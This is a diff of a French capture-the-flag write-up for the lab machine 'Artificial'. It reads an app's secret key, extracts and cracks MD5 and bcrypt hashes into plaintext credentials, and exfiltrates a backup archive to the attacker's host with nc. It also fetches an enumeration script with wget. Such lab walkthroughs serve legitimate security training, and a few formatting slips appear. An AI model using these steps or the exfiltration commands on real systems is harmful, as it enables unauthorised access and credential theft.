@@ -873,6 +873,9 @@ Tu peux également confirmer avec :
 
 ```bash
 cat /etc/passwd
+
+gael:x:1000:1000:gael:/home/gael:/bin/bash
+app:x:1001:1001:,,,:/home/app:/bin/bash
 ```
 
 Le fichier `user.txt` n’étant pas présent dans `/home/app`, il est probable qu’il se trouve dans `/home/gael`, auquel tu n’as pas accès.
@@ -885,10 +888,30 @@ L’analyse du répertoire courant montre que le fichier `app.py` est lisible :
 
 ```bash
 ls -la
+total 36
+drwxrwxr-x 7 app app 4096 Jun  9  2025 .
+drwxr-x--- 6 app app 4096 Jun  9  2025 ..
+-rw-rw-r-- 1 app app 7846 Jun  9  2025 app.py
+drwxr-xr-x 2 app app 4096 Apr 29 07:28 instance
+drwxrwxr-x 2 app app 4096 Apr 29 07:28 models
+drwxr-xr-x 2 app app 4096 Jun  9  2025 __pycache__
+drwxrwxr-x 4 app app 4096 Jun  9  2025 static
+drwxrwxr-x 2 app app 4096 Jun 18  2025 templates
+```
+
+```bash
 cat app.py
 ```
 
-tu trouves notamment ceci :
+Tu identifies rapidement une clé secrète Flask :
+
+```python
+app.secret_key = "Sup3rS3cr3tKey4rtIfici4L"
+```
+
+Cette clé est utilisée pour la gestion des sessions web, mais elle ne permet pas ici d’obtenir un accès direct en SSH avec l’utilisateur `gael`.
+
+En poursuivant l’analyse, tu trouves la configuration de la base de données :
 
 ```python
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
@@ -896,7 +919,7 @@ app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 app.config['UPLOAD_FOLDER'] = 'models'
 ```
 
-et un peu plus loin :
+Un peu plus loin, tu identifies le mécanisme de hash des mots de passe :
 
 ```python
 def hash(password):
@@ -921,7 +944,7 @@ Le fichier est localisé dans le répertoire `instance` de l’application :
 
 #### Extraction des identifiants
 
-Tu l’ouvres avec `sqlite3` :
+Tu ouvres `users.db` avec `sqlite3` :
 
 ``` bash
 sqlite3 instance/users.db
@@ -945,7 +968,7 @@ sqlite> select * from user;
 sqlite>
 ```
 
-Cela permet de récupérer le hash MD5 associé à l’utilisateur `gael`.
+Cela te permet de récupérer le hash MD5 associé à l’utilisateur `gael`.
 
 ```sql
 1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
@@ -956,6 +979,8 @@ Cela permet de récupérer le hash MD5 associé à l’utilisateur `gael`.
 #### Crack du mot de passe
 
 Tu utilises ensuite un service de crack comme CrackStation pour retrouver le mot de passe en clair.
+
+
 
 ![Interface CrackStation montrant le déchiffrement du hash MD5 de l’utilisateur gael révélant le mot de passe mattp005numbertwo](gael-crackstation.png)
 
@@ -1004,7 +1029,291 @@ Une fois le fichier `user.txt` récupéré, la prise de pied est validée. Tu pe
 ### Sudo -l
 Tu commences toujours par vérifier les droits sudo :
 
+```bash
+gael@artificial:~$ sudo -l
+[sudo] password for gael: 
+Sorry, user gael may not run sudo on artificial.
+gael@artificial:~
+```
+
+Le résultat est clair : l’utilisateur `gael` ne dispose d’aucun droit sudo.
+
+Tu peux donc écarter cette piste et poursuivre l’énumération.
+
+### Exploration du contexte utilisateur
+
+Avant d’aller plus loin, tu vérifies le contexte dans lequel tu te trouves :
+
+```bash
+whoami
+id
+pwd
+uname -a
+hostname
+```
+
+Résultat :
+
+```bash
+gael@artificial:~$ whoami
+gael
+gael@artificial:~$ id
+uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
+gael@artificial:~$ pwd
+/home/gael
+gael@artificial:~$ uname -a
+Linux artificial 5.4.0-216-generic #236-Ubuntu SMP Fri Apr 11 19:53:21 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+gael@artificial:~$ hostname
+artificial
+gael@artificial:~
+```
+
+Tu observes que :
+
+- tu es connecté en tant qu’utilisateur `gael`
+- tu appartiens au groupe supplémentaire `sysadm`
+- tu es dans ton répertoire personnel `/home/gael`
+- le système est une machine Ubuntu avec un noyau Linux 5.4
+
+#### Exploration du groupe sysadm
+
+Lors de l’analyse du contexte, un élément attire ton attention : l’utilisateur `gael` appartient au groupe `sysadm`.
+
+Ce type de groupe est souvent utilisé pour des tâches d’administration et peut donner accès à des fichiers sensibles.
+
+Tu décides donc d’explorer cette piste en recherchant les fichiers accessibles par ce groupe :
+
+```
+find / -group sysadm 2>/dev/null
+```
+
+Résultat :
+
+```
+/var/backups/backrest_backup.tar.gz
+```
+
+Un seul fichier ressort, mais il est particulièrement intéressant :
+
+- il se trouve dans `/var/backups`, un emplacement souvent réservé aux sauvegardes
+- son nom suggère une archive liée à **Backrest**, un outil de backup
+
+Les fichiers de sauvegarde contiennent fréquemment :
+
+- des configurations
+- des identifiants
+- voire des fichiers sensibles du système
+
+Ce fichier mérite donc une analyse approfondie.
+
+#### Récupération de la sauvegarde
+
+Plutôt que d’analyser l’archive directement sur la machine cible, tu choisis de la récupérer sur ta machine Kali en utilisant la recette {{< recette "copier-fichiers-kali" >}}
+
+Sur ta machine Kali, tu ouvres un listener :
+
+```bash
+nc -lvnp 4444 > backrest_backup.tar.gz
+```
+
+Sur la machine cible, tu envoies le fichier :b
+
+```bash
+cd /var/backups
+nc 10.10.16.93 4444 < backrest_backup.tar.gz
+```
+
+Le fichier est alors transféré directement vers ta machine Kali.
+
+#### Analyse locale de l’archive
+
+Une fois le fichier récupéré sur Kali, tu tentes de l’extraire :
+
+```bash
+tar -xzf backrest_backup.tar.gz
+```
+
+Résultat :
+
+```bash
+gzip: stdin: not in gzip format
+tar: Child returned status 1
+tar: Error is not recoverable: exiting now
+```
+
+Cette erreur indique que le fichier **n’est pas compressé en gzip**, malgré son extension `.tar.gz`.
+
+Tu vérifies alors son type réel :
+
+```bash
+file backrest_backup.tar.gz
+
+backrest_backup.tar.gz: POSIX tar archive (GNU)
+```
+
+Dans ce cas, il s’agit en réalité d’une archive **tar simple**.
+
+Tu adaptes donc la commande d’extraction :
+
+```
+tar -xf backrest_backup.tar.gz
+```
+
+Tu explores ensuite son contenu :
+
+```bash
+ls -la
+
+total 51072
+drwxrwxrwx 2 kali kali        0 Mar  4  2025 .
+drwxrwxrwx 2 kali kali        0 Apr 29 10:40 ..
+-rwxrwxrwx 1 kali kali 25690264 Feb 16  2025 backrest
+drwxrwxrwx 2 kali kali        0 Mar  3  2025 .config
+-rwxrwxrwx 1 kali kali     3025 Mar  3  2025 install.sh
+-rwxrwxrwx 1 kali kali       64 Mar  3  2025 jwt-secret
+-rwxrwxrwx 1 kali kali    57344 Mar  4  2025 oplog.sqlite
+-rwxrwxrwx 1 kali kali        0 Mar  3  2025 oplog.sqlite.lock
+-rwxrwxrwx 1 kali kali    32768 Mar  4  2025 oplog.sqlite-shm
+-rwxrwxrwx 1 kali kali        0 Mar  4  2025 oplog.sqlite-wal
+drwxrwxrwx 2 kali kali        0 Mar  3  2025 processlogs
+-rwxrwxrwx 1 kali kali 26501272 Mar  3  2025 restic
+drwxrwxrwx 2 kali kali        0 Mar  4  2025 tasklogs
+```
+
+En te basant sur l’expression **"Permissions et root"** de la recette {{< recette "analyse-mots-cles" >}}, tu lances la recherche suivante :
+
+```bash
+grep -REi 'sudo|root|permission|owner|chmod|chown|suid|uid|gid|user|pass|login|auth|credential|creds' .
+```
+
+Résultat :
+
+```bash
+.config/backrest/config.json:  "auth": {
+.config/backrest/config.json:    "users": [
+.config/backrest/config.json:        "name": "backrest_root",
+.config/backrest/config.json:        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
+install.sh:    sudo systemctl stop backrest
+install.sh:  sudo mkdir -p /usr/local/bin
+install.sh:  sudo cp $(ls -1 backrest | head -n 1) /usr/local/bin
+install.sh:  sudo tee /etc/systemd/system/backrest.service > /dev/null <<- EOM
+install.sh:User=$(whoami)
+install.sh:WantedBy=multi-user.target
+install.sh:  sudo systemctl daemon-reload
+install.sh:  sudo systemctl enable backrest
+install.sh:  sudo systemctl start backrest
+processlogs/backrest.log:{"level":"debug","msg":"loading auth secret from file"}
+```
+
+#### Analyse des résultats
+
+Parmi ces résultats, plusieurs fichiers apparaissent, mais tous ne sont pas pertinents pour une élévation de privilèges.
+
+Tu te focalises sur le fichier :
+
+```
+.config/backrest/config.json
+```
+
+qui contient :
+
+- un utilisateur : `backrest_root`
+- un champ `passwordBcrypt`
+
+C’est l’élément le plus intéressant de cette recherche.
+
+Les autres résultats (`install.sh`, logs, binaires) apportent du contexte sur le fonctionnement de l’application, mais ne fournissent pas directement de vecteur d’exploitation.
+
+#### Décodage du hash bcrypt
+
+Le champ `passwordBcrypt` contient la valeur suivante :
+
+```
+JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP
+```
+
+Cette chaîne ne correspond pas directement à un hash bcrypt classique (qui commence par `$2a$`), mais plusieurs indices indiquent qu’il s’agit d’un encodage **Base64** : elle ne contient que des caractères autorisés (lettres, chiffres, `/`), ne comporte aucun caractère `$`, et le nom du champ (`passwordBcrypt`) suggère qu’un hash bcrypt est attendu. Tu valides cette hypothèse en la décodant :
+
+```
+echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d
+```
+
+Résultat :
+
+```
+$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO 
+```
+
+Le préfixe `$2a$10$` confirme qu’il s’agit bien d’un **hash bcrypt valide**.
+
+~~~bash
+Tu places ensuite le hash bcrypt dans `hashcat` avec le mode `3200`, correspondant à bcrypt :
+
+```bash
+hashcat -m 3200 \
+  '$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO' \
+  /usr/share/wordlists/rockyou.txt
+~~~
+
+Hashcat identifie correctement le format :
+
+```
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Status...........: Cracked
+```
+
+Le mot de passe est retrouvé rapidement :
+
+```bash
+b$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
+```
+
+Tu obtiens donc les identifiants suivants pour l’interface Backrest :
+
+```bash
+backrest_root:!@#$%^
+```
+
+Tu peux également utiliser John pour tenter de casser le hash bcrypt.
+
+Tu commences par décoder la valeur Base64 et l’enregistrer dans un fichier :
+
+```
+echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d > hash.txt
+```
+
+Tu lances ensuite John avec la wordlist `rockyou.txt` :
+
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+John détecte automatiquement le format bcrypt :
+
+```
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+```
+
+Le mot de passe est trouvé rapidement :
+
+```
+!@#$%^
+```
+
+Tu peux confirmer le résultat avec :
+
+```
+john --show hash.txt
+```
+
+Tu obtiens ainsi les identifiants suivants :
+
+```
+backrest_root:!@#$%^
+```
+
 ### Recherche de binaires SUID
+
 Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.
 
 ```bash
@@ -1013,14 +1322,26 @@ find / -perm -4000 -type f 2>/dev/null
 
 La liste obtenue ne contient que des binaires système classiques tels que :
 
-```texte
-/usr/bin/passwd
-/usr/bin/chsh
+```bash
+/usr/bin/gpasswd
 /usr/bin/chfn
-/usr/bin/sudo
 /usr/bin/newgrp
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/at
+/usr/bin/umount
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
 ...
 ```
+
+Ces binaires sont classiques sur un système Linux et sont généralement présents par défaut.
 
 Tu n’identifies aucun binaire inhabituel ou directement exploitable.
 
@@ -1032,6 +1353,11 @@ La vérification se fait avec la commande suivante :
 
 ```bash
 getcap -r / 2>/dev/null
+
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 ```
 
 Ici, tu ne trouves aucune capability inhabituelle ni aucun binaire exploitable.
@@ -1050,6 +1376,66 @@ cd /dev/shm
 wget http://10.10.x.x:8000/suid3num.py
 python3 suid3num.py
 ```
+```bash
+  ___ _   _ _ ___    _____  _ _   _ __  __ 
+ / __| | | / |   \  |__ / \| | | | |  \/  |
+ \__ \ |_| | | |) |  |_ \ .` | |_| | |\/| |
+ |___/\___/|_|___/  |___/_|\_|\___/|_|  |_|  twitter@syed__umar
+
+[#] Finding/Listing all SUID Binaries ..
+------------------------------
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/at
+/usr/bin/umount
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+------------------------------
+
+
+[!] Default Binaries (Don't bother)
+------------------------------
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/at
+/usr/bin/umount
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+------------------------------
+
+
+[~] Custom SUID Binaries (Interesting Stuff)
+------------------------------
+------------------------------
+
+
+[#] SUID Binaries found in GTFO bins..
+------------------------------
+[!] None :(
+------------------------------
+
+
+
+```
+
 L’outil confirme que :
 
 - tous les binaires SUID présents sont standards
@@ -1068,14 +1454,41 @@ Les crons système peuvent être consultés avec :
 cat /etc/crontab
 ```
 
+```bash
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+```
+
+
+
+Tu n’identifies ici aucune tâche personnalisée, aucun script spécifique à l’application, ni aucune commande directement exploitable.
+
+La piste des tâches cron système ne donne donc rien à ce stade.
+
 ### Analyse des services locaux
+
 Tu vérifies ensuite les **services en cours d’exécution**, ce qui permet parfois d’identifier une application vulnérable ou un service mal configuré.
 
 ```
 netstat -tulpn
 ```
 
+```bash
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN
+tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
+```
+
+
+
+
+
 ### pspy64
+
 Tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.
 
 Tu le télécharges et l’exécutes depuis un répertoire persistant (/var/tmp) :
